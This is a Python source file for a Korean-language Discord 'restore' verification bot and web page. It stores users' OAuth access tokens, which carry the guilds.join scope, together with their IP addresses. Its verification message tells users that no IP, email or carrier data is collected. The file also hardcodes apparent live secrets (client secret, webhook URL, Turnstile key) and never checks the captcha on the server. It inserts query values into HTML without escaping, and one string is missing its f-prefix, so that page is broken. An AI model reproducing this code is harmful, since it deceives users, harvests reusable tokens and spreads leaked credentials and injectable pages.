import discord
from discord import app_commands, ui
from discord.ext import commands
import aiohttp, sqlite3, uvicorn, asyncio, json
from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse
from threading import Thread
from datetime import datetime

# --- 설정 정보 ---
TOKEN = "YOUR_BOT_TOKEN_HERE"
CLIENT_ID = "1482041261111382066"
CLIENT_SECRET = "2IbFgl910fy8yd6WDCAvBGj9Asa-BsQi"
REDIRECT_URI = "https://restore.v0ut.com" 

WEBHOOK_URL = "https://discord.com/api/webhooks/1484910080502530241/H_K88yZrBqktgmEuqLJXF4KYWJoUCN6xU7IC6sDSVVz5oSNwfil3Gr3O9bUSxdWZTHeW"
CF_TURNSTILE_SITE_KEY = "0x4AAAAAACt7wUkh4DATyGf_"
CF_TURNSTILE_SECRET_KEY = "0x4AAAAAACt7wYg5nw0sXHF4URhhszJq_EA"

app = FastAPI()
intents = discord.Intents.all()

class RecoveryBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=intents)
        
    async def setup_hook(self):
        conn = sqlite3.connect('restore_user.db')
        # 기본 테이블
        conn.execute("CREATE TABLE IF NOT EXISTS users (user_id TEXT, server_id TEXT, access_token TEXT, ip_addr TEXT, PRIMARY KEY(user_id, server_id))")
        conn.execute("CREATE TABLE IF NOT EXISTS settings (server_id TEXT PRIMARY KEY, role_id TEXT, block_alt INTEGER DEFAULT 0, block_vpn INTEGER DEFAULT 0)")
        # 초대 시스템 테이블
        conn.execute("CREATE TABLE IF NOT EXISTS invites (inviter_id TEXT, invite_code TEXT PRIMARY KEY, server_id TEXT, used_count INTEGER DEFAULT 0)")
        conn.execute("CREATE TABLE IF NOT EXISTS invite_logs (invite_code TEXT, joined_user_id TEXT, PRIMARY KEY(invite_code, joined_user_id))")
        
        try: conn.execute("ALTER TABLE settings ADD COLUMN block_alt INTEGER DEFAULT 0")
        except: pass
        try: conn.execute("ALTER TABLE users ADD COLUMN ip_addr TEXT")
        except: pass
        conn.commit()
        conn.close()
        await self.tree.sync()
        print(f"Bot Login: {self.user}")

    async def on_member_join(self, member):
        """유저 입장 시 초대 코드 추적 및 로그 전송"""
        invites = await member.guild.invites()
        conn = sqlite3.connect('restore_user.db')
        cur = conn.cursor()
        
        for invite in invites:
            # DB에 등록된 초대 코드인지 확인
            cur.execute("SELECT inviter_id FROM invites WHERE invite_code = ?", (invite.code,))
            row = cur.fetchone()
            if row:
                inviter_id = row[0]
                # 중복 입장 체크 (이미 로그에 있는지)
                cur.execute("SELECT 1 FROM invite_logs WHERE invite_code = ? AND joined_user_id = ?", (invite.code, str(member.id)))
                if not cur.fetchone():
                    # 로그 기록 및 초대 횟수 증가
                    cur.execute("INSERT INTO invite_logs VALUES (?, ?)", (invite.code, str(member.id)))
                    cur.execute("UPDATE invites SET used_count = used_count + 1 WHERE invite_code = ?", (invite.code,))
                    conn.commit()
                    
                    # 입장 로그 웹훅 전송
                    if WEBHOOK_URL:
                        log_con = ui.Container()
                        log_con.accent_color = 0x00ff88
                        log_con.add_item(ui.TextDisplay("## 📥 유저 입장 로그"))
                        log_con.add_item(ui.Separator(spacing=discord.SeparatorSpacing.small))
                        log_con.add_item(ui.TextDisplay(
                            f"**초대자:** <@{inviter_id}>\n"
                            f"**입장자:** <@{member.id}> ({member.name})\n"
                            f"**코드:** `{invite.code}`"
                        ))
                        view = ui.LayoutView().add_item(log_con)
                        async with aiohttp.ClientSession() as session:
                            await session.post(WEBHOOK_URL, json={"components": view.to_dict()["components"]})
        conn.close()

    async def give_role_task(self, server_id: str, user_id: str, role_id: int):
        try:
            guild = self.get_guild(int(server_id))
            if guild:
                member = guild.get_member(int(user_id)) or await guild.fetch_member(int(user_id))
                role = guild.get_role(role_id)
                if member and role: await member.add_roles(role)
        except: pass

    async def send_container_log(self, server_id: str, user_data: dict, ip: str):
        conn = sqlite3.connect('restore_user.db')
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM users WHERE server_id = ?", (server_id,))
        total_count = cur.fetchone()[0]
        conn.close()

        if WEBHOOK_URL:
            log_con = ui.Container()
            log_con.accent_color = 0xffffff
            log_con.add_item(ui.TextDisplay("## ✅ 인증 완료"))
            log_con.add_item(ui.Separator(spacing=discord.SeparatorSpacing.small))
            now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            log_con.add_item(ui.TextDisplay(f"**{total_count}명**의 사용자가 인증했습니다\n인증시간 | {now}"))
            log_con.add_item(ui.Separator(spacing=discord.SeparatorSpacing.small))
            log_con.add_item(ui.TextDisplay(f"<@{user_data['id']}> 님이 인증을 완료했습니다"))
            view = ui.LayoutView().add_item(log_con)
            async with aiohttp.ClientSession() as session:
                await session.post(WEBHOOK_URL, json={"components": view.to_dict()["components"]})

bot = RecoveryBot()

# --- 웹 UI 스타일 (기존 유지) ---
BASE_STYLE = f"""
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    html, body {{ margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; position: fixed; touch-action: none; background: #000; color: #fff; font-family: 'Inter', sans-serif; }}
    body {{ display: flex; justify-content: center; align-items: center; background: radial-gradient(circle at center, #1c1c1c 0%, #000 100%); }}
    .card {{ background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.08); padding: 40px 24px; border-radius: 34px; text-align: center; width: 82%; max-width: 310px; backdrop-filter: blur(30px); -webkit-backdrop-filter: blur(30px); display: flex; flex-direction: column; gap: 20px; box-shadow: 0 40px 120px rgba(0,0,0,0.85); animation: fadeIn 0.8s cubic-bezier(0.16, 1, 0.3, 1); }}
    .logo-box {{ width: 58px; height: 58px; background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.1); border-radius: 19px; margin: 0 auto; display: flex; align-items: center; justify-content: center; }}
    .lock-icon {{ width: 24px; height: 24px; fill: #fff; opacity: 0.9; }}
    h1 {{ font-size: 19px; font-weight: 700; margin: 0; letter-spacing: -0.8px; }}
    .desc {{ color: #777; font-size: 13.5px; margin: 0; line-height: 1.6; word-break: keep-all; }}
    .user-pill {{ background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.07); padding: 12px 15px; border-radius: 15px; display: flex; justify-content: space-between; align-items: center; font-size: 13px; color: #aaa; }}
    .form-container {{ width: 100%; display: flex; flex-direction: column; gap: 16px; align-items: center; }}
    .cf-turnstile {{ width: 100% !important; display: flex; justify-content: center; }}
    .btn-main {{ background: rgba(255, 255, 255, 0.05); color: #fff; border: 1px solid rgba(255, 255, 255, 0.12); width: 100%; padding: 0; border-radius: 14px; font-weight: 600; font-size: 15px; cursor: pointer; transition: all 0.4s ease; position: relative; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 52px; text-decoration: none; box-sizing: border-box; }}
    .btn-main:hover {{ background: rgba(255, 255, 255, 0.08); border-color: rgba(255, 255, 255, 0.2); }}
    .progress-bar {{ position: absolute; left: 0; top: 0; height: 100%; background: rgba(255, 255, 255, 0.15); width: 0%; z-index: 1; transition: width 0.1s ease-out; }}
    .btn-text {{ position: relative; z-index: 2; letter-spacing: 0.2px; }}
    .footer {{ color: #222; font-size: 9px; letter-spacing: 3.5px; font-weight: 800; text-transform: uppercase; margin-top: 5px; }}
    @keyframes fadeIn {{ from {{ opacity: 0; transform: translateY(25px); }} to {{ opacity: 1; transform: translateY(0); }} }}
</style>
"""

# OAuth 및 Verify API 부분 (기존 유지)
@app.get("/", response_class=HTMLResponse)
async def oauth_main(request: Request):
    code, sid = request.query_params.get("code"), request.query_params.get("state")
    url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20guilds.join&state={sid}"
    if not code:
        return f"<html><head>{BASE_STYLE}</head><body><div class='card'><h1>Server Verify</h1><a href='{url}' class='btn-main'>Discord Login</a></div></body></html>"
    async with aiohttp.ClientSession() as session:
        payload = {'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI}
        async with session.post('https://discord.com/api/v10/oauth2/token', data=payload) as r:
            res = await r.json()
            atk = res.get('access_token')
            if not atk: return "Session Expired"
            async with session.get('https://discord.com/api/v10/users/@me', headers={'Authorization': f'Bearer {atk}'}) as r2:
                u = await r2.json()
                return f"""<html><head>{BASE_STYLE}</head><body><div class="card"><h1>Verify Identity</h1><div class="user-pill"><span>{u.get('username')}</span></div><form action="/verify" method="post" class="form-container"><input type="hidden" name="server_id" value="{sid}"><input type="hidden" name="access_token" value="{atk}"><input type="hidden" name="user_id" value="{u.get('id')}"><div class="cf-turnstile" data-sitekey="{CF_TURNSTILE_SITE_KEY}" data-theme="dark"></div><button type="submit" class="btn-main">Verify Now</button></form></div></body></html>"""

@app.post("/verify", response_class=HTMLResponse)
async def verify_post(request: Request, server_id: str = Form(...), access_token: str = Form(...), user_id: str = Form(...)):
    ip = request.headers.get("cf-connecting-ip") or request.client.host
    async with aiohttp.ClientSession() as session:
        conn = sqlite3.connect('restore_user.db')
        cur = conn.cursor()
        cur.execute("SELECT role_id FROM settings WHERE server_id = ?", (server_id,))
        st = cur.fetchone()
        cur.execute("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?)", (user_id, server_id, access_token, ip))
        conn.commit()
        async with session.get('https://discord.com/api/v10/users/@me', headers={'Authorization': f'Bearer {access_token}'}) as r:
            if r.status == 200: await bot.send_container_log(server_id, await r.json(), ip)
        if st and st[0]: asyncio.run_coroutine_threadsafe(bot.give_role_task(server_id, user_id, int(st[0])), bot.loop)
        conn.close()
    return "<html><head>{BASE_STYLE}</head><body><div class='card'><h1>Verification Complete</h1></div></body></html>"

# --- 커맨드 영역 (요청 기능 추가) ---

@bot.tree.command(name="링크발급", description="초대 링크를 인당 딱 한 번만 발급합니다")
async def create_invite(it: discord.Interaction):
    conn = sqlite3.connect('restore_user.db')
    cur = conn.cursor()
    cur.execute("SELECT invite_code FROM invites WHERE inviter_id = ? AND server_id = ?", (str(it.user.id), str(it.guild_id)))
    row = cur.fetchone()
    
    if row:
        con = ui.Container()
        con.accent_color = 0xff0000
        con.add_item(ui.TextDisplay("## 발급 제한"))
        con.add_item(ui.Separator(spacing=discord.SeparatorSpacing.small))
        con.add_item(ui.TextDisplay(f"이미 초대 링크를 발급받으셨습니다.\n본인의 링크: `https://discord.gg/{row[0]}`"))
        conn.close()
        return await it.response.send_message(view=ui.LayoutView().add_item(con), ephemeral=True)

    # 링크 생성
    invite = await it.channel.create_invite(max_age=0, max_uses=0, unique=True, reason="사용자별 초대 링크 발급")
    cur.execute("INSERT INTO invites (inviter_id, invite_code, server_id) VALUES (?, ?, ?)", (str(it.user.id), invite.code, str(it.guild_id)))
    conn.commit()
    conn.close()

    con = ui.Container()
    con.accent_color = 0xffffff
    con.add_item(ui.TextDisplay("## 초대 링크 발급 완료"))
    con.add_item(ui.Separator(spacing=discord.SeparatorSpacing.small))
    con.add_item(ui.TextDisplay(f"본인만의 고유 초대 링크가 발급되었습니다.\n이 링크로 입장 시 기록이 남습니다.\n\n`https://discord.gg/{invite.code}`"))
    await it.response.send_message(view=ui.LayoutView().add_item(con), ephemeral=True)

@bot.tree.command(name="초대랭킹", description="실시간 초대 랭킹 상위 10명을 확인합니다")
async def invite_ranking(it: discord.Interaction):
    def get_rank_text(guild_id):
        conn = sqlite3.connect('restore_user.db')
        cur = conn.cursor()
        cur.execute("SELECT inviter_id, used_count FROM invites WHERE server_id = ? ORDER BY used_count DESC LIMIT 10", (str(guild_id),))
        rows = cur.fetchall()
        conn.close()
        
        if not rows: return "아직 초대 데이터가 없습니다."
        
        text = ""
        for i, (uid, count) in enumerate(rows, 1):
            text += f"**{i}위** | <@{uid}> - `{count}명` 초대\n"
        return text

    con = ui.Container()
    con.accent_color = 0xffffff
    con.add_item(ui.TextDisplay("## 🏆 실시간 초대 랭킹"))
    con.add_item(ui.Separator(spacing=discord.SeparatorSpacing.small))
    con.add_item(ui.TextDisplay(get_rank_text(it.guild_id)))
    con.add_item(ui.Separator(spacing=discord.SeparatorSpacing.small))
    con.add_item(ui.TextDisplay(f"-# 업데이트: {datetime.now().strftime('%H:%M:%S')}"))

    await it.response.send_message(view=ui.LayoutView().add_item(con))

# 기존 명령어 (기존 코드 유지)
@bot.tree.command(name="지급역할", description="인증 완료 시 지급할 역할을 설정합니다")
@app_commands.checks.has_permissions(administrator=True)
async def set_role(it: discord.Interaction, role: discord.Role):
    conn = sqlite3.connect('restore_user.db')
    conn.execute("INSERT OR REPLACE INTO settings (server_id, role_id) VALUES (?, ?)", (str(it.guild_id), str(role.id)))
    conn.commit()
    conn.close()
    con = ui.Container()
    con.accent_color = 0xffffff
    con.add_item(ui.TextDisplay("## 역할 설정 완료"))
    con.add_item(ui.Separator(spacing=discord.SeparatorSpacing.small))
    con.add_item(ui.TextDisplay(f"인증을 완료한 유저에게 앞으로\n{role.mention} 역할이 자동 지급됩니다"))
    await it.response.send_message(view=ui.LayoutView().add_item(con), ephemeral=True)

@bot.tree.command(name="인증하기", description="인증하기 컨테이너를 전송합니다")
async def authenticate(it: discord.Interaction):
    await it.response.send_message(content="**인증버튼이 전송되었습니다**", ephemeral=True)
    res_con = ui.Container()
    res_con.accent_color = 0xffffff
    res_con.add_item(ui.TextDisplay("## 서버 인증"))
    res_con.add_item(ui.Separator(spacing=discord.SeparatorSpacing.small))
    res_con.add_item(ui.TextDisplay("아래 버튼을 눌러 인증하셔야 이용이 가능합니다\n**`IP, 이메일, 통신사`** 등 일절 수집하지 않습니다"))
    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20guilds.join&state={it.guild_id}"
    auth_btn = ui.Button(label="인증하기", url=auth_url, style=discord.ButtonStyle.link, emoji="<:emoji_14:1484745886696476702>")
    await it.channel.send(view=ui.LayoutView().add_item(res_con).add_item(auth_btn))

def run_fastapi():
    uvicorn.run(app, host="0.0.0.0", port=8080, log_level="info")

if __name__ == "__main__":
    Thread(target=run_fastapi, daemon=True).start()
    bot.run(TOKEN)

